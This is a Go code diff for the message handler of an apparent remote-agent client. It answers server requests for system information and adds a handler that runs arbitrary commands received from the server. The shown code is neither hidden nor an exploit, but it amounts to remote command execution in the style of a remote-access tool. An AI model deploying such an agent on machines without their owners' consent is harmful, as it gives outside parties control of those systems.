@@ -1,45 +1,54 @@
 package message
 
 import (
-	"../modules"
-	"./types"
-	"bytes"
-	"encoding/gob"
+        "../modules"
+        "../modules/os"
+        "./types"
+        "encoding/gob"
+        "log"
 )
 
 /*
  * HandleMessage() function handles commands sent from the server
- * First byte of the buffer is the message ID, the rest of it is the payload
- * This function returns a byte array containing the response that should be sent back to the server
+ * This function only handles commands with no payload. If a payload
+ * needs to be received, use HandleMessageWithPayload
  */
-func HandleMessage(buffer []byte) []byte {
-	if len(buffer) == 0 {
-		return []byte{byte(types.ERR_MESSAGE_TOO_SMALL)}
-	}
-	messageID := buffer[0]
+func HandleMessage(messageID byte) (responseID byte, response interface{}) {
 
-	/// Messages with no payload
-	/// Ping
-	if messageID == types.REQ_PING {
-		return []byte{byte(types.RES_PING)}
-	}
+        /// Messages with no payload
+        /// Ping
+        if messageID == types.REQ_PING {
+                return types.RES_PING, nil
+        }
 
-	/// Basic system info
-	if messageID == types.REQ_BASIC_SYSTEM_INFO {
-		responseBuffer := new(bytes.Buffer)		// Create a buffer for our encoding
-		responseBuffer.Write([]byte{byte(types.RES_BASIC_SYSTEM_INFO)})		// Add the response ID to the beginning of the response
-		gobObj := gob.NewEncoder(responseBuffer)		// Create the gob encoder
-		err := gobObj.Encode(modules.GetBasicSystemInfo())
-		if err != nil {		// Return a gob encoding error if we can't encode
-			return []byte{byte(types.ERR_GOB_ENCODING)}
-		}
+        /// Basic system info
+        if messageID == types.REQ_BASIC_SYSTEM_INFO {
+                return types.RES_BASIC_SYSTEM_INFO, modules.GetBasicSystemInfo()
+        }
 
-		return responseBuffer.Bytes()	// Return the buffer
-	}
+        if messageID == types.REQ_SYSTEM_INFO {
+                return types.RES_SYSTEM_INFO, modules.GetSystemInfo()
+        }
 
-	/// Messages with payload
-	// payload := buffer[1:]
+        // The message wasn't handled for some reason
+        return types.ERR_MESSAGE_NOT_HANDLED, nil
+}
 
-	// The message wasn't handled for some reason
-	return []byte{byte(types.ERR_MESSAGE_NOT_HANDLED)}
+/*
+ * HandleMessageWithPayload() function takes a message ID and
+ * A gob decoder which can be used to decode into the neccessary structure
+ */
+func HandleMessageWithPayload(messageID byte, decoder *gob.Decoder) (responseID byte, response interface{}) {
+        if messageID == types.REQ_RUN_COMMAND {
+                var req types.RunCommandRequest
+                err := decoder.Decode(&req)
+                if err != nil {
+                        log.Printf("error decoding: %s", err)
+                        return types.ERR_GOB, nil
+                }
+                var res types.RunCommandReponse
+                res.Success, res.Response = os.RunCommand(req.Command, req.Backround)
+                return types.RES_RUN_COMMAND, res
+        }
+        return types.ERR_MESSAGE_NOT_HANDLED, nil
 }
